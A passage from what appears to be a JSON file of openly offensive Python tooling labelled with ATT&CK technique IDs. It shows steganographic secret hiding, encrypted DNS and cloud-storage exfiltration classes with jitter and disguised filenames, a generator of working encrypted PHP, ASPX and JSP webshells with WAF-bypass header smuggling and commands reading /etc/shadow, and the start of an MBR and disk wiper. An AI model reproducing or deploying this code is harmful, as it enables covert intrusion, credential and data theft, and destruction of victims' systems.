length_bits.append(raw[pos] & 1)\n        data_len = 0\n        for b in length_bits: data_len = (data_len << 1) | b\n\n        # Read data + checksum\n        total_bits = (4 + data_len + 4) * 8\n        positions = self._scatter_positions(len(usable), total_bits)\n        all_bits = []\n        for i in range(total_bits):\n            pos = usable[positions[i]]\n            all_bits.append(raw[pos] & 1)\n\n        payload = bytearray()\n        for i in range(0, len(all_bits), 8):\n            byte_val = 0\n            for b in all_bits[i:i+8]: byte_val = (byte_val << 1) | b\n            payload.append(byte_val)\n\n        secret = bytes(payload[4:4+data_len])\n        checksum = bytes(payload[4+data_len:4+data_len+4])\n        if password:\n            key = hashlib.pbkdf2_hmac('sha256', password.encode(), b'steg-salt-v2', 50000)\n            secret = bytes(a ^ b for a, b in zip(secret, (key * (len(secret) // 32 + 1))[:len(secret)]))\n        if hashlib.sha256(secret).digest()[:4] != checksum:\n            raise ValueError('Checksum mismatch \u2014 wrong password or corrupted data')\n        return secret\n\n# --- demo ---\ndef create_test_png(w=64, h=64):\n    \"\"\"Create a minimal valid RGB PNG\"\"\"\n    raw = bytearray()\n    for y in range(h):\n        raw.append(0)  # filter byte\n        for x in range(w):\n            raw.extend([x*4 & 255, y*4 & 255, (x+y)*2 & 255])\n    compressed = zlib.compress(bytes(raw), 9)\n    ihdr = struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)\n    chunks = [(b'IHDR', ihdr, 0), (b'IDAT', compressed, 0), (b'IEND', b'', 0)]\n    out = bytearray(b'\\x89PNG\\r\\n\\x1a\\n')\n    for ctype, cdata, _ in chunks:\n        out += struct.pack('>I', len(cdata)) + ctype + cdata\n        out += struct.pack('>I', zlib.crc32(ctype + cdata) & 0xffffffff)\n    return bytes(out)\n\npng = create_test_png(64, 64)\nengine = SteganographyEngine(seed=42)\ncap = engine.capacity(png)\nprint('PNG: 64x64 RGB, capacity: %d bytes' % cap)\n\nsecrets = [\n    b'Agent COBALT exfil coords: 51.5074N, 0.1278W',\n    b'AES-256 key: ' + os.urandom(32).hex().encode(),\n]\nfor secret in secrets:\n    stego = engine.embed(png, secret, password='OpSec2026')\n    recovered = engine.extract(stego, password='OpSec2026')\n    print('  Embedded %d bytes, recovered match: %s' % (len(secret), recovered == secret))\n    print('  PNG size delta: %+d bytes' % (len(stego) - len(png)))\n\n# Verify wrong password fails\ntry:\n    engine.extract(stego, password='wrong')\n    print('  FAIL: wrong password should fail')\nexcept (ValueError, Exception):\n    print('  Wrong password correctly rejected')",
  "staged_exfil_dns": "import hashlib,hmac as _hm,os,struct\n_S=bytes([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22])\n_RC=[1,2,4,8,16,32,64,128,27,54]\ndef _xt(a):return((a<<1)^0x1b)&0xff if a&0x80 else(a<<1)&0xff\ndef _kx(k):\n    w=[k[4*i:4*i+4]for i in range(8)]\n    for i in range(8,60):\n        t=bytearray(w[i-1])\n        if i%8==0:t=bytearray([_S[t[1]],_S[t[2]],_S[t[3]],_S[t[0]]]);t[0]^=_RC[i//8-1]\n        elif i%8==4:t=bytearray(_S[b]for b in t)\n        w.append(bytes(a^b for a,b in zip(w[i-8],t)))\n    return[b''.join(w[4*r:4*r+4])for r in range(15)]\ndef _ab(bl,rk):\n    s=bytearray(a^b for a,b in zip(bl,rk[0]))\n    for r in range(1,14):\n        s=bytearray(_S[b]for b in s)\n        s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n        for c in range(4):\n            j=c*4;a0,a1,a2,a3=s[j],s[j+1],s[j+2],s[j+3]\n            s[j]=_xt(a0)^_xt(a1)^a1^a2^a3;s[j+1]=a0^_xt(a1)^_xt(a2)^a2^a3\n            s[j+2]=a0^a1^_xt(a2)^_xt(a3)^a3;s[j+3]=_xt(a0)^a0^a1^a2^_xt(a3)\n        s=bytearray(a^b for a,b in zip(s,rk[r]))\n    s=bytearray(_S[b]for b in s);s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n    return bytes(a^b for a,b in zip(s,rk[14]))\ndef aes_ctr(data,key,nonce):\n    rk=_kx(key);out=bytearray()\n    for i in range(0,len(data),16):\n        ks=_ab(nonce+struct.pack('>I',i//16),rk);out.extend(a^b for a,b in zip(data[i:i+16],ks))\n    return bytes(out)\ndef aes_enc(pt,pw):\n    if isinstance(pt,str):pt=pt.encode()\n    if isinstance(pw,str):pw=pw.encode()\n    salt=os.urandom(16);nonce=os.urandom(12)\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    ct=aes_ctr(pt,dk[:32],nonce);tag=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    return salt+nonce+ct+tag\ndef aes_dec(data,pw):\n    if isinstance(pw,str):pw=pw.encode()\n    salt,nonce,tag=data[:16],data[16:28],data[-32:];ct=data[28:-32]\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    exp=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    if not _hm.compare_digest(tag,exp):raise ValueError('HMAC fail')\n    return aes_ctr(ct,dk[:32],nonce)\n\nimport base64\nimport time\nimport random\n\nclass DNSExfiltrator:\n    \"\"\"AES-encrypted staged DNS exfiltration (T1048.003)\"\"\"\n\n    MAX_LABEL = 63\n    LABELS_PER_QUERY = 3\n\n    def __init__(self, domain, passphrase, jitter=(0.5, 2.0)):\n        self.domain = domain\n        self.passphrase = passphrase\n        self.jitter = jitter\n        self.rng = random.Random(os.urandom(8))\n\n    def _encode_chunk(self, data):\n        \"\"\"Encode binary chunk as DNS-safe base32\"\"\"\n        return base64.b32encode(data).decode().rstrip('=').lower()\n\n    def _decode_chunk(self, label):\n        \"\"\"Decode DNS label back to binary\"\"\"\n        padded = label.upper() + '=' * ((8 - len(label) % 8) % 8)\n        return base64.b32decode(padded)\n\n    def prepare_exfil(self, data, session_id=None):\n        \"\"\"Encrypt and chunk data for DNS exfil\"\"\"\n        if isinstance(data, str): data = data.encode()\n        if session_id is None:\n            session_id = os.urandom(4).hex()\n\n        encrypted = aes_enc(data, self.passphrase)\n        encoded = self._encode_chunk(encrypted)\n\n        # Chunk into DNS-safe labels\n        max_data_per_query = self.MAX_LABEL * self.LABELS_PER_QUERY - len(session_id) - 8\n        chunks = []\n        for i in range(0, len(encoded), max_data_per_query):\n            chunk = encoded[i:i+max_data_per_query]\n            chunks.append(chunk)\n\n        queries = []\n        total = len(chunks)\n        for seq, chunk in enumerate(chunks):\n            # Format: <session>.<seq>-<total>.<chunk_part1>.<chunk_part2>.<domain>\n            parts = []\n            for j in range(0, len(chunk), self.MAX_LABEL):\n                parts.append(chunk[j:j+self.MAX_LABEL])\n            query = '%s.%d-%d.%s.%s' % (session_id, seq, total, '.'.join(parts), self.domain)\n            queries.append(query)\n\n        return queries, session_id\n\n    def reassemble(self, responses, session_id):\n        \"\"\"Reassemble and decrypt exfiltrated data from DNS responses\"\"\"\n        ordered = {}\n        for query in responses:\n            parts = query.split('.')\n            sid = parts[0]\n            if sid != session_id: continue\n            seq_total = parts[1].split('-')\n            seq = int(seq_total[0])\n            # Extract data labels (between seq-total and domain)\n            domain_parts = self.domain.split('.')\n            data_labels = parts[2:-len(domain_parts)]\n            ordered[seq] = ''.join(data_labels)\n\n        encoded = ''.join(ordered[k] for k in sorted(ordered.keys()))\n        encrypted = self._decode_chunk(encoded)\n        return aes_dec(encrypted, self.passphrase)\n\n    def simulate_exfil(self, data):\n        \"\"\"Simulate full exfiltration cycle\"\"\"\n        queries, sid = self.prepare_exfil(data)\n        received = []\n        for q in queries:\n            delay = self.rng.uniform(*self.jitter)\n            # In real operation: socket.getaddrinfo(q, None) or dns.resolver.resolve(q, 'A')\n            received.append(q)\n\n        return self.reassemble(received, sid)\n\n# --- demo ---\nexfil = DNSExfiltrator('cdn-telemetry.example.com', 'ExfilKey-NIGHTFALL-2026', jitter=(0.1, 0.3))\ntest_data = [\n    b'admin:P@ssw0rd123!',\n    b'SSN: 123-45-6789\\nCC: 4111-1111-1111-1111\\nCVV: 123',\n    os.urandom(256),\n]\nfor data in test_data:\n    queries, sid = exfil.prepare_exfil(data)\n    recovered = exfil.simulate_exfil(data)\n    label = data[:30].decode(errors='replace') if len(data) < 50 else '%d bytes' % len(data)\n    print('  [%2d queries] %s \u2014 match: %s' % (len(queries), label, recovered == data))\n    avg_len = sum(len(q) for q in queries) / len(queries)\n    print('              avg query length: %d chars' % avg_len)",
  "exfil_https_cloud": "import hashlib,hmac as _hm,os,struct\n_S=bytes([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22])\n_RC=[1,2,4,8,16,32,64,128,27,54]\ndef _xt(a):return((a<<1)^0x1b)&0xff if a&0x80 else(a<<1)&0xff\ndef _kx(k):\n    w=[k[4*i:4*i+4]for i in range(8)]\n    for i in range(8,60):\n        t=bytearray(w[i-1])\n        if i%8==0:t=bytearray([_S[t[1]],_S[t[2]],_S[t[3]],_S[t[0]]]);t[0]^=_RC[i//8-1]\n        elif i%8==4:t=bytearray(_S[b]for b in t)\n        w.append(bytes(a^b for a,b in zip(w[i-8],t)))\n    return[b''.join(w[4*r:4*r+4])for r in range(15)]\ndef _ab(bl,rk):\n    s=bytearray(a^b for a,b in zip(bl,rk[0]))\n    for r in range(1,14):\n        s=bytearray(_S[b]for b in s)\n        s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n        for c in range(4):\n            j=c*4;a0,a1,a2,a3=s[j],s[j+1],s[j+2],s[j+3]\n            s[j]=_xt(a0)^_xt(a1)^a1^a2^a3;s[j+1]=a0^_xt(a1)^_xt(a2)^a2^a3\n            s[j+2]=a0^a1^_xt(a2)^_xt(a3)^a3;s[j+3]=_xt(a0)^a0^a1^a2^_xt(a3)\n        s=bytearray(a^b for a,b in zip(s,rk[r]))\n    s=bytearray(_S[b]for b in s);s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n    return bytes(a^b for a,b in zip(s,rk[14]))\ndef aes_ctr(data,key,nonce):\n    rk=_kx(key);out=bytearray()\n    for i in range(0,len(data),16):\n        ks=_ab(nonce+struct.pack('>I',i//16),rk);out.extend(a^b for a,b in zip(data[i:i+16],ks))\n    return bytes(out)\ndef aes_enc(pt,pw):\n    if isinstance(pt,str):pt=pt.encode()\n    if isinstance(pw,str):pw=pw.encode()\n    salt=os.urandom(16);nonce=os.urandom(12)\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    ct=aes_ctr(pt,dk[:32],nonce);tag=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    return salt+nonce+ct+tag\ndef aes_dec(data,pw):\n    if isinstance(pw,str):pw=pw.encode()\n    salt,nonce,tag=data[:16],data[16:28],data[-32:];ct=data[28:-32]\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    exp=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    if not _hm.compare_digest(tag,exp):raise ValueError('HMAC fail')\n    return aes_ctr(ct,dk[:32],nonce)\n\nimport base64\nimport json\nimport time\nimport random\n\nclass CloudExfiltrator:\n    \"\"\"AES-encrypted HTTPS cloud exfiltration (T1567.002)\"\"\"\n\n    CLOUD_CONFIGS = {\n        's3': {\n            'url_fmt': 'https://%%s.s3.%%s.amazonaws.com/%%s',\n            'method': 'PUT',\n            'headers': {'Content-Type': 'application/octet-stream'},\n        },\n        'azure': {\n            'url_fmt': 'https://%%s.blob.core.windows.net/%%s/%%s',\n            'method': 'PUT',\n            'headers': {'x-ms-blob-type': 'BlockBlob'},\n        },\n        'gcs': {\n            'url_fmt': 'https://storage.googleapis.com/upload/storage/v1/b/%%s/o?name=%%s',\n            'method': 'POST',\n            'headers': {'Content-Type': 'application/octet-stream'},\n        },\n    }\n    CHUNK_SIZE = 4 * 1024 * 1024  # 4MB chunks\n\n    def __init__(self, passphrase, cloud='s3', jitter=(1.0, 5.0)):\n        self.passphrase = passphrase\n        self.cloud = cloud\n        self.jitter = jitter\n        self.rng = random.Random(os.urandom(8))\n        self.session_id = os.urandom(8).hex()\n\n    def _generate_filename(self, chunk_idx):\n        \"\"\"Generate innocuous-looking filename\"\"\"\n        prefixes = ['telemetry', 'analytics', 'logs', 'metrics', 'health']\n        prefix = self.rng.choice(prefixes)\n        ts = int(time.time())\n        return '%s_%d_%04d.bin' % (prefix, ts, chunk_idx)\n\n    def prepare_upload(self, data):\n        \"\"\"Encrypt and prepare data for chunked upload\"\"\"\n        if isinstance(data, str): data = data.encode()\n        encrypted = aes_enc(data, self.passphrase)\n\n        # Split into chunks\n        chunks = []\n        for i in range(0, len(encrypted), self.CHUNK_SIZE):\n            chunk = encrypted[i:i+self.CHUNK_SIZE]\n            chunk_hash = hashlib.sha256(chunk).hexdigest()[:16]\n            filename = self._generate_filename(len(chunks))\n            manifest_entry = {\n                'idx': len(chunks),\n                'filename': filename,\n                'size': len(chunk),\n                'hash': chunk_hash,\n            }\n            chunks.append((chunk, manifest_entry))\n\n        manifest = {\n            'session': self.session_id,\n            'total_chunks': len(chunks),\n            'total_size': len(encrypted),\n            'original_size': len(data),\n            'checksum': hashlib.sha256(encrypted).hexdigest(),\n            'chunks': [c[1] for c in chunks],\n        }\n        enc_manifest = aes_enc(json.dumps(manifest).encode(), self.passphrase + '-manifest')\n        return chunks, enc_manifest\n\n    def simulate_upload(self, data):\n        \"\"\"Simulate full upload cycle with jitter\"\"\"\n        chunks, manifest = self.prepare_upload(data)\n        uploaded = []\n        for chunk_data, entry in chunks:\n            delay = self.rng.uniform(*self.jitter)\n            # Real: urllib.request.Request(url, data=chunk_data, headers=headers, method='PUT')\n            uploaded.append(entry)\n\n        return uploaded, manifest\n\n    def reassemble(self, chunk_data_list, manifest_enc):\n        \"\"\"Reassemble and decrypt exfiltrated data\"\"\"\n        manifest = json.loads(aes_dec(manifest_enc, self.passphrase + '-manifest'))\n        reassembled = b''\n        for chunk in chunk_data_list:\n            reassembled += chunk\n        if hashlib.sha256(reassembled).hexdigest() != manifest['checksum']:\n            raise ValueError('Checksum mismatch')\n        return aes_dec(reassembled, self.passphrase)\n\n# --- demo ---\nexfil = CloudExfiltrator('CloudKey-APEX-2026', cloud='s3', jitter=(0.01, 0.05))\ntest_data = [\n    b'Database dump: users table with 1000 PII records',\n    os.urandom(512),\n    json.dumps({'api_key': 'sk-live-abc123', 'db_password': 'Pr0d-DB!'}).encode(),\n]\nfor data in test_data:\n    chunks, manifest = exfil.prepare_upload(data)\n    chunk_data = [c[0] for c in chunks]\n    recovered = exfil.reassemble(chunk_data, manifest)\n    label = data[:40].decode(errors='replace') if len(data) < 60 else '%d bytes' % len(data)\n    print('  [%d chunks] %s' % (len(chunks), label))\n    print('    encrypted size: %d bytes, match: %s' % (sum(len(c) for c in chunk_data), recovered == data))\n    print('    filenames: %s' % [c[1]['filename'] for c in chunks])",
  "webshell_deployment": "import hashlib,hmac as _hm,os,struct\n_S=bytes([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22])\n_RC=[1,2,4,8,16,32,64,128,27,54]\ndef _xt(a):return((a<<1)^0x1b)&0xff if a&0x80 else(a<<1)&0xff\ndef _kx(k):\n    w=[k[4*i:4*i+4]for i in range(8)]\n    for i in range(8,60):\n        t=bytearray(w[i-1])\n        if i%8==0:t=bytearray([_S[t[1]],_S[t[2]],_S[t[3]],_S[t[0]]]);t[0]^=_RC[i//8-1]\n        elif i%8==4:t=bytearray(_S[b]for b in t)\n        w.append(bytes(a^b for a,b in zip(w[i-8],t)))\n    return[b''.join(w[4*r:4*r+4])for r in range(15)]\ndef _ab(bl,rk):\n    s=bytearray(a^b for a,b in zip(bl,rk[0]))\n    for r in range(1,14):\n        s=bytearray(_S[b]for b in s)\n        s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n        for c in range(4):\n            j=c*4;a0,a1,a2,a3=s[j],s[j+1],s[j+2],s[j+3]\n            s[j]=_xt(a0)^_xt(a1)^a1^a2^a3;s[j+1]=a0^_xt(a1)^_xt(a2)^a2^a3\n            s[j+2]=a0^a1^_xt(a2)^_xt(a3)^a3;s[j+3]=_xt(a0)^a0^a1^a2^_xt(a3)\n        s=bytearray(a^b for a,b in zip(s,rk[r]))\n    s=bytearray(_S[b]for b in s);s=bytearray([s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]])\n    return bytes(a^b for a,b in zip(s,rk[14]))\ndef aes_ctr(data,key,nonce):\n    rk=_kx(key);out=bytearray()\n    for i in range(0,len(data),16):\n        ks=_ab(nonce+struct.pack('>I',i//16),rk);out.extend(a^b for a,b in zip(data[i:i+16],ks))\n    return bytes(out)\ndef aes_enc(pt,pw):\n    if isinstance(pt,str):pt=pt.encode()\n    if isinstance(pw,str):pw=pw.encode()\n    salt=os.urandom(16);nonce=os.urandom(12)\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    ct=aes_ctr(pt,dk[:32],nonce);tag=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    return salt+nonce+ct+tag\ndef aes_dec(data,pw):\n    if isinstance(pw,str):pw=pw.encode()\n    salt,nonce,tag=data[:16],data[16:28],data[-32:];ct=data[28:-32]\n    dk=hashlib.pbkdf2_hmac('sha256',pw,salt,100000,64)\n    exp=_hm.new(dk[32:],salt+nonce+ct,hashlib.sha256).digest()\n    if not _hm.compare_digest(tag,exp):raise ValueError('HMAC fail')\n    return aes_ctr(ct,dk[:32],nonce)\n\nimport base64\nimport time\nimport random\n\nclass WebshellEngine:\n    SHELL_ENCRYPTED_PHP = (\n        '<?php\\n'\n        '$k=hash(\"sha256\",$_SERVER[\"HTTP_X_AUTH\"],true);\\n'\n        '$iv=substr(base64_decode($_POST[\"d\"]),0,16);\\n'\n        '$ct=substr(base64_decode($_POST[\"d\"]),16);\\n'\n        '$cmd=openssl_decrypt($ct,\"aes-256-cbc\",$k,OPENSSL_RAW_DATA,$iv);\\n'\n        'if($cmd!==false){\\n'\n        '    $o=shell_exec($cmd);\\n'\n        '    $iv2=random_bytes(16);\\n'\n        '    echo base64_encode($iv2.openssl_encrypt($o,\"aes-256-cbc\",$k,OPENSSL_RAW_DATA,$iv2));\\n'\n        '}\\n'\n        '?>'\n    )\n    SHELL_CHUNKED_PHP = (\n        '<?php\\n'\n        '$c=\"\";$h=getallheaders();\\n'\n        'foreach($h as $n=>$v){if(substr($n,0,2)===\"X-\"){$c.=$v;}}\\n'\n        '$p=base64_decode(str_rot13($c));\\n'\n        'ob_start();passthru($p);$o=ob_get_clean();\\n'\n        'header(\"Transfer-Encoding: chunked\");\\n'\n        'foreach(str_split($o,rand(100,500)) as $ch){\\n'\n        '    echo dechex(strlen($ch)).\"\\\\r\\\\n\".$ch.\"\\\\r\\\\n\";flush();usleep(rand(1000,5000));\\n'\n        '}echo \"0\\\\r\\\\n\\\\r\\\\n\";\\n'\n        '?>'\n    )\n    SHELL_MEMORY_PHP = (\n        '<?php\\n'\n        '$s=$_SERVER;$a=isset($s[\"HTTP_ACCEPT_LANGUAGE\"])?$s[\"HTTP_ACCEPT_LANGUAGE\"]:\"\";\\n'\n        'if(strlen($a)>50){\\n'\n        '    $d=base64_decode(substr($a,strpos($a,\",\")+1));\\n'\n        '    $z=@gzuncompress($d);\\n'\n        '    if($z!==false)eval($z);\\n'\n        '}\\n'\n        '?>'\n    )\n    SHELL_ASPX = (\n        '<%@ Page Language=\"C#\" %>\\n'\n        '<%@ Import Namespace=\"System.Security.Cryptography\" %>\\n'\n        '<%@ Import Namespace=\"System.IO\" %>\\n'\n        '<%\\n'\n        'string key = Request.Headers[\"X-Session-Token\"];\\n'\n        'if(!string.IsNullOrEmpty(key)){\\n'\n        '    byte[] k = System.Text.Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0,32));\\n'\n        '    byte[] data = Convert.FromBase64String(Request.Form[\"payload\"]);\\n'\n        '    using(Aes aes = Aes.Create()){\\n'\n        '        aes.Key = k; aes.IV = data.Take(16).ToArray();\\n'\n        '        byte[] ct = data.Skip(16).ToArray();\\n'\n        '        using(var dec = aes.CreateDecryptor())\\n'\n        '        using(var ms = new MemoryStream(dec.TransformFinalBlock(ct,0,ct.Length))){\\n'\n        '            string cmd = new StreamReader(ms).ReadToEnd();\\n'\n        '            var p = new System.Diagnostics.Process();\\n'\n        '            p.StartInfo.FileName = \"cmd.exe\";\\n'\n        '            p.StartInfo.Arguments = \"/c \" + cmd;\\n'\n        '            p.StartInfo.RedirectStandardOutput = true;\\n'\n        '            p.StartInfo.UseShellExecute = false;\\n'\n        '            p.Start();\\n'\n        '            string output = p.StandardOutput.ReadToEnd();\\n'\n        '            byte[] iv2 = new byte[16];\\n'\n        '            using(var rng = RandomNumberGenerator.Create()) rng.GetBytes(iv2);\\n'\n        '            aes.IV = iv2;\\n'\n        '            using(var enc = aes.CreateEncryptor())\\n'\n        '            using(var ms2 = new MemoryStream()){\\n'\n        '                byte[] ob = System.Text.Encoding.UTF8.GetBytes(output);\\n'\n        '                byte[] ect = enc.TransformFinalBlock(ob,0,ob.Length);\\n'\n        '                Response.Write(Convert.ToBase64String(iv2.Concat(ect).ToArray()));\\n'\n        '            }\\n'\n        '        }\\n'\n        '    }\\n'\n        '}\\n'\n        '%>'\n    )\n    SHELL_JSP = (\n        '<%@ page import=\"javax.crypto.*,javax.crypto.spec.*,java.util.*,java.io.*\" %>\\n'\n        '<%\\n'\n        'String k = request.getHeader(\"X-Api-Key\");\\n'\n        'if(k != null && k.length() >= 16){\\n'\n        '    byte[] key = k.substring(0,16).getBytes(\"UTF-8\");\\n'\n        '    byte[] data = Base64.getDecoder().decode(request.getParameter(\"q\"));\\n'\n        '    byte[] iv = Arrays.copyOfRange(data,0,16);\\n'\n        '    byte[] ct = Arrays.copyOfRange(data,16,data.length);\\n'\n        '    Cipher c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\\n'\n        '    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key,\"AES\"), new IvParameterSpec(iv));\\n'\n        '    String cmd = new String(c.doFinal(ct));\\n'\n        '    Process p = Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});\\n'\n        '    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\\n'\n        '    StringBuilder sb = new StringBuilder();\\n'\n        '    String line;\\n'\n        '    while((line=br.readLine())!=null) sb.append(line+\"\\\\n\");\\n'\n        '    byte[] iv2 = new byte[16];\\n'\n        '    new java.security.SecureRandom().nextBytes(iv2);\\n'\n        '    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key,\"AES\"), new IvParameterSpec(iv2));\\n'\n        '    byte[] ect = c.doFinal(sb.toString().getBytes());\\n'\n        '    byte[] resp = new byte[iv2.length+ect.length];\\n'\n        '    System.arraycopy(iv2,0,resp,0,16);\\n'\n        '    System.arraycopy(ect,0,resp,16,ect.length);\\n'\n        '    out.print(Base64.getEncoder().encodeToString(resp));\\n'\n        '}\\n'\n        '%>'\n    )\n\n    def __init__(self, passphrase):\n        self.passphrase = passphrase\n        self.rng = random.Random(os.urandom(8))\n\n    def generate_php_shell(self, variant='encrypted'):\n        if variant == 'encrypted': return self.SHELL_ENCRYPTED_PHP\n        elif variant == 'chunked': return self.SHELL_CHUNKED_PHP\n        elif variant == 'memory_only': return self.SHELL_MEMORY_PHP\n\n    def generate_aspx_shell(self): return self.SHELL_ASPX\n    def generate_jsp_shell(self): return self.SHELL_JSP\n\n    def generate_waf_bypass_payload(self, cmd):\n        techniques = {\n            'parameter_pollution': 'cmd=who&cmd=ami joined as whoami',\n            'chunked_body': 'Transfer-Encoding chunked with randomized sizes',\n            'unicode_normalization': 'unicode escapes normalize to command',\n            'header_smuggling': 'Command split across X-Custom-N headers',\n            'comment_injection': 'SQL-style comment injection in parameters',\n        }\n        parts = [cmd[i:i+3] for i in range(0, len(cmd), 3)]\n        headers = {}\n        for idx, part in enumerate(parts):\n            headers['X-Req-%02d' % idx] = base64.b64encode(part.encode()).decode()\n        return headers, techniques\n\n# --- demo ---\nengine = WebshellEngine('WebShellKey-PHANTOM-2026')\nshells = {\n    'PHP encrypted': engine.generate_php_shell('encrypted'),\n    'PHP chunked (WAF bypass)': engine.generate_php_shell('chunked'),\n    'PHP memory-only': engine.generate_php_shell('memory_only'),\n    'ASPX encrypted': engine.generate_aspx_shell(),\n    'JSP encrypted': engine.generate_jsp_shell(),\n}\nfor name, shell in shells.items():\n    print('%s: %d bytes, %d lines' % (name, len(shell), shell.count('\\n')+1))\n\nheaders, techniques = engine.generate_waf_bypass_payload('whoami && cat /etc/shadow')\nprint('\\nWAF bypass techniques: %d' % len(techniques))\nprint('Header smuggling: %d headers for %d-char command' % (len(headers), len('whoami && cat /etc/shadow')))\n\ntest_cmd = b'id && uname -a && cat /etc/passwd'\nencrypted = aes_enc(test_cmd, 'WebShellKey-PHANTOM-2026')\ndecrypted = aes_dec(encrypted, 'WebShellKey-PHANTOM-2026')\nprint('\\nCommand encryption: %d bytes encrypted, match: %s' % (len(encrypted), decrypted == test_cmd))",
  "data_destruction_wiper": "import os\nimport struct\nimport hashlib\nimport time\n\nclass DataDestroyer:\n    \"\"\"Multi-method data destruction engine (T1561.001 + T1561.002)\"\"\"\n\n    GUTMANN_PATTERNS = [\n        None, None, None, None,  # 4 random passes\n        bytes([0x55]*512), bytes([0xAA]*512), bytes([0x92,0x49,0x24]*171)[:512],\n        bytes([0x49,0x24,0x92]*171)[:512], bytes([0x24,0x92,0x49]*171)[:512],\n        bytes([0x00]*512), bytes([0x11]*512), bytes([0x22]*512),\n        bytes([0x33]*512), bytes([0x44]*512), bytes([0x55]*512),\n        bytes([0x66]*512), bytes([0x77]*512), bytes([0x88]*512),\n        bytes([0x99]*512), bytes([0xAA]*512), bytes([0xBB]*512),\n        bytes([0xCC]*512), bytes([0xDD]*512), bytes([0xEE]*512),\n        bytes([0xFF]*512), bytes([0x92,0x49,0x24]*171)[:512],\n        bytes([0x49,0x24,0x92]*171)[:512], bytes([0x24,0x92,0x49]*171)[:512],\n        bytes([0x6D,0xB6,0xDB]*171)[:512], bytes([0xB6,0xDB,0x6D]*171)[:512],\n        bytes([0xDB,0x6D,0xB6]*171)[:512],\n        None, None, None, None,  # 4 random passes\n    ]\n\n    MBR_SIZE = 512\n    MBR_SIG_OFFSET = 510\n    MBR_SIGNATURE = b'\\x55\\xAA'\n    NTFS_MFT_RECORD = 1024\n\n    def __init__(self):\n      